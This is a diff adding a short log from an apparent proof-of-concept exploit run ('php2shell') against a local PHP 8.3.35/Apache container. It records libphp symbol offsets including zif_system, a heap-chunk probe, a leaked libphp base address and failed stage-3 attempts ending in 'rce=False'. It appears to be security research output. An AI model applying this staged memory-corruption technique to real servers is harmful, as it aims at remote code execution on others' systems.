@@ -1,0 +1,17 @@
+zif_system     0x377428
+zval_ptr_dtor  0x46fcc0
+wrote /tmp/p2s-pocs/9bie_php2shell/out/offsets.env
+[*] target http://127.0.0.1:8091/index.php: PHP 8.3.35 / Apache/2.4.69 (Debian)
+[*] container config: {'memory_limit': 8388608, 'display_errors': 'unknown (CLI says Off)', 'session_upload_progress': 'On', 'workers': 1}
+[*] extracting libphp symbols from p2s-matrix-8335
+[*] stage1 probe: stale block taken by v0841
+    N=841 len=63 -> cookie=4096 chunk=0xffff84600000
+[*] stage2 T=406 -> libphp=0xffff866f0000
+    stage3 0x690d8/bookworm: no proof
+    stage3 0x690d8/lab: no proof
+    stage3 0x6e0d8/bookworm: no proof
+    stage3 0x6e0d8/lab: no proof
+    stage3 0x5404a/bookworm: no proof
+    stage3 0x5404a/lab: no proof
+[*] wrote /Users/dpua/Downloads/php-vuln/profiles/8.3.35-bookworm-aarch64.json
+[*] rce=False chunk=0xffff84600000 libphp=0xffff866f0000
